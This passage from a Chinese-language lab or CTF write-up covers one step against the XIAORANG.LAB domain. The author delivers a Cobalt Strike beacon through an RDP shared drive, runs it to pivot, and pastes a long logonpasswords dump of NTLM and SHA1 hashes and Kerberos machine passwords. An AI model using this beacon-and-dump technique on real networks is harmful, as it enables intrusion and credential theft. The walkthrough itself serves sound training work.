+<h2 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a><strong>flag3</strong></h2><p>经过尝试发现，这台机子好像不出网，用cs上线吧，不然太卡了。</p>
+<p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141008988.png" alt="img"></p>
+<p>利用rdp共享磁盘，把前面丢在桌面的cs马传进去。</p>
+<p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141008651.png" alt="img"></p>
+<p>我们右键之前拿到的shell，创建一个新的监听器用来转发上线。</p>
+<p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141008339.png" alt="img"></p>
+<p>然后选择该监听器添加payload。</p>
+<p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141009015.png" alt="img"></p>
+<p>得到beacon.exe，c盘需要管理员，我丢在桌面去运行的。</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">Aldrich</span>\<span class="title">Desktop</span>\<span class="title">beacon.exe</span></span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/./Tsclient.assets/1739176792837-6283bb8f-150b-49cb-9119-6c4867e2c7b0.png" alt="img"></p>
+<p>拿到该shell，利用 logonpasswords  获取凭证。<code>logonpasswords</code> 是 Cobalt Strike 中的一个命令，用于从目标系统中提取登录凭证，包括明文密码、哈希值等。  </p>
+<details class="lake-collapse"><summary id="ub663880a"><span class="ne-text">凭证</span></summary><p id="udc86e5a8" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Authentication Id : 0 ; 920067 (00000000:000e0a03)</span></p><p id="u62b3e7d7" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Session           : RemoteInteractive from 2</span></p><p id="u3ccb7236" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">User Name         : Aldrich</span></p><p id="ud2ba829b" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Domain            : XIAORANG</span></p><p id="u220e77b4" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Logon Server      : DC01</span></p><p id="u379f2a6f" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Logon Time        : 2025/2/10 16:26:05</span></p><p id="uabd4eb04" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">SID               : S-1-5-21-3289074908-3315245560-3429321632-1105</span></p><p id="u2d683dd5" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	msv :	</span></p><p id="u28155898" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	 [00000003] Primary</span></p><p id="u8a3151e5" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	 * Username : Aldrich</span></p><p id="u1674ae36" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	 * Domain   : XIAORANG</span></p><p id="u1ddb6e51" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	 * NTLM     : d62791e860125717d444c4c49b8aaa01</span></p><p id="u2152fc31" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	 * SHA1     : 3d25b2f82389ff91006d7c8ba3434e81aff39457</span></p><p id="uf4274973" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	 * DPAPI    : e060f634872ec1e9dab2e6725908e689</span></p><p id="uc64972f8" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	tspkg :	</span></p><p id="uad098433" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	wdigest :	</span></p><p id="u4af91e51" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	 * Username : Aldrich</span></p><p id="u613ea5ce" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	 * Domain   : XIAORANG</span></p><p id="u32fc9c9a" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	 * Password : (null)</span></p><p id="u0126a7ee" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	kerberos :	</span></p><p id="u6dcccb74" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	 * Username : Aldrich</span></p><p id="u81c43ed2" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	 * Domain   : XIAORANG.LAB</span></p><p id="u8bfdc612" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	 * Password : (null)</span></p><p id="uf1f8f8f8" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	ssp :	</span></p><p id="u6747f2eb" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	credman :	</span></p><p id="ua3dba9a7" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"></span></p><p id="ud31a35ee" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Authentication Id : 0 ; 897088 (00000000:000db040)</span></p><p id="udcbee81e" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Session           : Interactive from 2</span></p><p id="u3be48a35" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">User Name         : DWM-2</span></p><p id="ubb534498" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Domain            : Window Manager</span></p><p id="uc917498a" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Logon Server      : (null)</span></p><p id="u90e87861" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Logon Time        : 2025/2/10 16:26:05</span></p><p id="u87c9778f" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">SID               : S-1-5-90-0-2</span></p><p id="ud39f013b" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	msv :	</span></p><p id="ue222cd6b" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	 [00000003] Primary</span></p><p id="u2c2abc0c" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	 * Username : WIN2016$</span></p><p id="u4296e841" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	 * Domain   : XIAORANG</span></p><p id="u505fbf66" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	 * NTLM     : 83c84a7d3f40516a50f56172f622c38e</span></p><p id="u8424241b" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	 * SHA1     : ac968d62fbbac3b04a453f87d261345268fc6566</span></p><p id="u8b370661" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	tspkg :	</span></p><p id="u0ab83055" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	wdigest :	</span></p><p id="ucc3b103e" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	 * Username : WIN2016$</span></p><p id="ud3c4172b" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	 * Domain   : XIAORANG</span></p><p id="uadb94fca" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	 * Password : (null)</span></p><p id="u062c6bf7" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	kerberos :	</span></p><p id="u60db5279" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	 * Username : WIN2016$</span></p><p id="u73281447" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	 * Domain   : xiaorang.lab</span></p><p id="u9147a780" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	 * Password : 17 21 e4 11 5b 9c 4a 70 2b 9c be 83 c3 7c b3 13 ba 9a f6 15 5e 31 81 ce ae f0 72 94 c3 39 b6 3c 31 34 46 02 34 d0 1a 76 7d bf 40 e5 85 ff 7d 41 b7 9c f3 e4 a2 43 31 a4 64 4b 78 34 08 3a f0 ba 35 c2 57 ea 9e 85 7b d9 dc 15 9c 7a df c1 e3 e9 1d 42 42 04 90 1a 25 96 86 e1 c3 8f b5 46 92 ff 57 cd 3f 40 76 25 fe de b3 f0 4e de d0 34 d6 01 2f 4d 02 50 8a cc da c3 63 7c 6d ab 88 ff 92 59 5e 48 b8 d2 99 3b cd 84 04 47 26 62 c4 99 b8 32 61 aa cf d6 63 7e d6 07 8d ed 31 d4 54 71 24 56 96 ff 7f 86 8f 1e 31 17 5b e3 30 bb 0f ca 61 ff a3 b8 cb 4e 55 9a a9 90 79 2b 6e 2e 77 79 ce f6 ed c7 1a 92 80 ca ae 92 4c 85 e7 9d 78 a4 b1 6a 43 42 34 2f fd 15 dc ac 7f 8b 9f ef 7a ab 77 2e e6 a3 be 70 f3 84 23 be 5c 80 fa 4b 27 80 c3 a5 </span></p><p id="u956313b6" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	ssp :	</span></p><p id="uebbe8509" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	credman :	</span></p><p id="u41c7370d" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"></span></p><p id="uc88d8152" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Authentication Id : 0 ; 54477 (00000000:0000d4cd)</span></p><p id="ue295715b" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Session           : Interactive from 1</span></p><p id="u1de4e40e" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">User Name         : DWM-1</span></p><p id="ud9a09811" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Domain            : Window Manager</span></p><p id="u9ae45bf6" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Logon Server      : (null)</span></p><p id="u8340a359" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Logon Time        : 2025/2/10 16:18:44</span></p><p id="u908b9db9" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">SID               : S-1-5-90-0-1</span></p><p id="ud29d8f72" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	msv :	</span></p><p id="u63e5b935" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	 [00000003] Primary</span></p><p id="u5abf97dc" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	 * Username : WIN2016$</span></p><p id="u4932b4be" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	 * Domain   : XIAORANG</span></p><p id="u334c8a55" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	 * NTLM     : 4ba974f170ab0fe1a8a1eb0ed8f6fe1a</span></p><p id="u9ddbd447" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	 * SHA1     : e06238ecefc14d675f762b08a456770dc000f763</span></p><p id="ucc2bbddc" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	tspkg :	</span></p><p id="uc06af955" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	wdigest :	</span></p><p id="u452aee0c" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	 * Username : WIN2016$</span></p><p id="ue5293eb4" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	 * Domain   : XIAORANG</span></p><p id="ue94fe439" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	 * Password : (null)</span></p><p id="u600ce69a" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	kerberos :	</span></p><p id="u32c10f1f" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	 * Username : WIN2016$</span></p><p id="ue0196147" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	 * Domain   : xiaorang.lab</span></p><p id="u9de3bbeb" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	 * Password : 9e ae c4 7a ed ee 91 74 a5 59 61 a5 00 2c c5 00 60 3b 87 48 d0 17 48 cf df 7b 14 af 9a 99 22 b5 94 ba 0a 1e f0 6e f0 25 b1 e2 a2 62 fb b8 68 93 42 64 08 b7 f6 2e f7 cf ae a3 7a 94 9d 32 24 1a b1 6b 87 6c 5e f1 d3 89 c6 c4 8b d3 bd 05 9c b0 e1 85 d4 2c 03 56 5f af 09 15 12 10 df 74 e7 4c d3 65 55 d8 ab bd b4 71 5c 8c a7 bd 14 60 8b 44 b5 d8 d8 61 23 f1 4f 4d 8e a0 dc ac 8a 60 15 0d f7 9f a1 85 98 c4 cf 34 ec ee ea c5 b9 5b 42 8b 97 cc 4d ed 1f db 8c b4 45 06 ce 40 fc 81 96 ac c3 61 e5 e9 42 90 69 f3 b2 85 fa 80 59 e2 8b a5 f6 70 5d 1a bd 5f b1 85 6b ae b0 16 42 29 2c 99 57 fb 49 ea e3 29 49 56 55 6c 9a 2b ee 13 77 fe d7 a3 51 b8 01 ec bb 60 22 b8 7c 2f f5 6b 0f 6b 87 36 76 45 81 7e e3 71 0a a8 ca 2a a3 a6 05 64 </span></p><p id="u27bf289b" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	ssp :	</span></p><p id="u0daaa056" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	credman :	</span></p><p id="ud8c5fa7b" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"></span></p><p id="udbd7f487" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Authentication Id : 0 ; 996 (00000000:000003e4)</span></p><p id="u50fc0845" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Session           : Service from 0</span></p><p id="u35dc0b9a" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">User Name         : WIN2016$</span></p><p id="u352ece8c" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Domain            : XIAORANG</span></p><p id="ube268837" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Logon Server      : (null)</span></p><p id="u1c933e33" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Logon Time        : 2025/2/10 16:18:44</span></p><p id="u56b12543" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">SID               : S-1-5-20</span></p><p id="ubad188a4" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	msv :	</span></p><p id="u245f8d00" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	 [00000003] Primary</span></p><p id="uaedaff23" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	 * Username : WIN2016$</span></p><p id="ueae07b2a" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	 * Domain   : XIAORANG</span></p><p id="ub7691005" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	 * NTLM     : 83c84a7d3f40516a50f56172f622c38e</span></p><p id="u243616c7" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	 * SHA1     : ac968d62fbbac3b04a453f87d261345268fc6566</span></p><p id="u9a157f51" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	tspkg :	</span></p><p id="u460edcb4" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	wdigest :	</span></p><p id="uf0458554" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	 * Username : WIN2016$</span></p><p id="ue3a17179" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	 * Domain   : XIAORANG</span></p><p id="ucf95eb5c" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	 * Password : (null)</span></p><p id="u085ed913" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	kerberos :	</span></p><p id="u144c6cf9" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	 * Username : win2016$</span></p><p id="ueb8246d4" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	 * Domain   : XIAORANG.LAB</span></p><p id="ua862f055" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	 * Password : 17 21 e4 11 5b 9c 4a 70 2b 9c be 83 c3 7c b3 13 ba 9a f6 15 5e 31 81 ce ae f0 72 94 c3 39 b6 3c 31 34 46 02 34 d0 1a 76 7d bf 40 e5 85 ff 7d 41 b7 9c f3 e4 a2 43 31 a4 64 4b 78 34 08 3a f0 ba 35 c2 57 ea 9e 85 7b d9 dc 15 9c 7a df c1 e3 e9 1d 42 42 04 90 1a 25 96 86 e1 c3 8f b5 46 92 ff 57 cd 3f 40 76 25 fe de b3 f0 4e de d0 34 d6 01 2f 4d 02 50 8a cc da c3 63 7c 6d ab 88 ff 92 59 5e 48 b8 d2 99 3b cd 84 04 47 26 62 c4 99 b8 32 61 aa cf d6 63 7e d6 07 8d ed 31 d4 54 71 24 56 96 ff 7f 86 8f 1e 31 17 5b e3 30 bb 0f ca 61 ff a3 b8 cb 4e 55 9a a9 90 79 2b 6e 2e 77 79 ce f6 ed c7 1a 92 80 ca ae 92 4c 85 e7 9d 78 a4 b1 6a 43 42 34 2f fd 15 dc ac 7f 8b 9f ef 7a ab 77 2e e6 a3 be 70 f3 84 23 be 5c 80 fa 4b 27 80 c3 a5 </span></p><p id="u3041b37d" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	ssp :	</span></p><p id="u9b49bb3b" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	credman :	</span></p><p id="u3274ef7b" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"></span></p><p id="u1c9c6bd4" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Authentication Id : 0 ; 897105 (00000000:000db051)</span></p><p id="uf92bf35d" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Session           : Interactive from 2</span></p><p id="uf82980d1" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">User Name         : DWM-2</span></p><p id="ucf42f769" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Domain            : Window Manager</span></p><p id="ue48d0822" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Logon Server      : (null)</span></p><p id="u3ec3c3f1" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Logon Time        : 2025/2/10 16:26:05</span></p><p id="ud109d8c5" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">SID               : S-1-5-90-0-2</span></p><p id="ub734c455" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	msv :	</span></p><p id="u6ac7176f" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	 [00000003] Primary</span></p><p id="u957b98ff" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	 * Username : WIN2016$</span></p><p id="u43fab7f6" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	 * Domain   : XIAORANG</span></p><p id="ud5ef7cf1" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	 * NTLM     : 4ba974f170ab0fe1a8a1eb0ed8f6fe1a</span></p><p id="u288a5517" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	 * SHA1     : e06238ecefc14d675f762b08a456770dc000f763</span></p><p id="u41e76e92" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	tspkg :	</span></p><p id="u89b62a35" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	wdigest :	</span></p><p id="u85448a22" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	 * Username : WIN2016$</span></p><p id="uf889af87" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	 * Domain   : XIAORANG</span></p><p id="u36cdfd52" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	 * Password : (null)</span></p><p id="ude711214" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	kerberos :	</span></p><p id="u550ff679" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	 * Username : WIN2016$</span></p><p id="u613e293b" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	 * Domain   : xiaorang.lab</span></p><p id="u71bc0361" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	 * Password : 9e ae c4 7a ed ee 91 74 a5 59 61 a5 00 2c c5 00 60 3b 87 48 d0 17 48 cf df 7b 14 af 9a 99 22 b5 94 ba 0a 1e f0 6e f0 25 b1 e2 a2 62 fb b8 68 93 42 64 08 b7 f6 2e f7 cf ae a3 7a 94 9d 32 24 1a b1 6b 87 6c 5e f1 d3 89 c6 c4 8b d3 bd 05 9c b0 e1 85 d4 2c 03 56 5f af 09 15 12 10 df 74 e7 4c d3 65 55 d8 ab bd b4 71 5c 8c a7 bd 14 60 8b 44 b5 d8 d8 61 23 f1 4f 4d 8e a0 dc ac 8a 60 15 0d f7 9f a1 85 98 c4 cf 34 ec ee ea c5 b9 5b 42 8b 97 cc 4d ed 1f db 8c b4 45 06 ce 40 fc 81 96 ac c3 61 e5 e9 42 90 69 f3 b2 85 fa 80 59 e2 8b a5 f6 70 5d 1a bd 5f b1 85 6b ae b0 16 42 29 2c 99 57 fb 49 ea e3 29 49 56 55 6c 9a 2b ee 13 77 fe d7 a3 51 b8 01 ec bb 60 22 b8 7c 2f f5 6b 0f 6b 87 36 76 45 81 7e e3 71 0a a8 ca 2a a3 a6 05 64 </span></p><p id="uf10f9d64" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	ssp :	</span></p><p id="u1c11df01" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	credman :	</span></p><p id="u6a7cb8d8" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"></span></p><p id="u9c0f1e47" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Authentication Id : 0 ; 995 (00000000:000003e3)</span></p><p id="u4154c12b" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Session           : Service from 0</span></p><p id="uc9192dd5" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">User Name         : IUSR</span></p><p id="uaafce0aa" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Domain            : NT AUTHORITY</span></p><p id="udc41a33a" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Logon Server      : (null)</span></p><p id="ub17ea022" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Logon Time        : 2025/2/10 16:18:47</span></p><p id="uaccbdb98" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">SID               : S-1-5-17</span></p><p id="u71b06155" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	msv :	</span></p><p id="u6d5ebf54" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	tspkg :	</span></p><p id="u66424e06" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	wdigest :	</span></p><p id="u8bb0d857" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	 * Username : (null)</span></p><p id="u9d75143f" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	 * Domain   : (null)</span></p><p id="ub9ab92c8" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	 * Password : (null)</span></p><p id="u339ec6ca" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	kerberos :	</span></p><p id="uf5ec1ae8" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	ssp :	</span></p><p id="u61acce0e" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	credman :	</span></p><p id="ufb4327b2" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"></span></p><p id="u3a333849" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Authentication Id : 0 ; 997 (00000000:000003e5)</span></p><p id="ubc7f8ddd" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Session           : Service from 0</span></p><p id="u720dd018" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">User Name         : LOCAL SERVICE</span></p><p id="u9143013f" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Domain            : NT AUTHORITY</span></p><p id="u38b5040d" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Logon Server      : (null)</span></p><p id="u60b33a66" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Logon Time        : 2025/2/10 16:18:44</span></p><p id="u2023a62e" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">SID               : S-1-5-19</span></p><p id="ueaa957e6" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	msv :	</span></p><p id="u5ebb8b30" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	tspkg :	</span></p><p id="u9a26f26d" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	wdigest :	</span></p><p id="u60901a25" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	 * Username : (null)</span></p><p id="u4cd44246" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	 * Domain   : (null)</span></p><p id="ub81ef860" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	 * Password : (null)</span></p><p id="u47169f84" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	kerberos :	</span></p><p id="u2af39a4f" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	 * Username : (null)</span></p><p id="u09189972" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	 * Domain   : (null)</span></p><p id="u047476dd" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	 * Password : (null)</span></p><p id="u59499368" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	ssp :	</span></p><p id="u2a3af67f" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	credman :	</span></p><p id="u320415bd" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"></span></p><p id="u98c8ff50" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Authentication Id : 0 ; 54440 (00000000:0000d4a8)</span></p><p id="u8fdbdb6b" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Session           : Interactive from 1</span></p><p id="u8a55fbcb" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">User Name         : DWM-1</span></p><p id="uc4141d5c" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Domain            : Window Manager</span></p><p id="u2f59d054" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Logon Server      : (null)</span></p><p id="u883120da" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Logon Time        : 2025/2/10 16:18:44</span></p><p id="u3e417595" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">SID               : S-1-5-90-0-1</span></p><p id="u49c2bc04" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	msv :	</span></p><p id="u66f86364" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	 [00000003] Primary</span></p><p id="u3ba66ecb" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	 * Username : WIN2016$</span></p><p id="uf6a39283" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	 * Domain   : XIAORANG</span></p><p id="u8b425736" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	 * NTLM     : 83c84a7d3f40516a50f56172f622c38e</span></p><p id="u386b4741" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	 * SHA1     : ac968d62fbbac3b04a453f87d261345268fc6566</span></p><p id="ucbbbdad5" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	tspkg :	</span></p><p id="u4df2381f" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	wdigest :	</span></p><p id="u71e935c9" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	 * Username : WIN2016$</span></p><p id="ua350c112" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	 * Domain   : XIAORANG</span></p><p id="u172c34ca" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	 * Password : (null)</span></p><p id="u48a28049" class="ne-p" 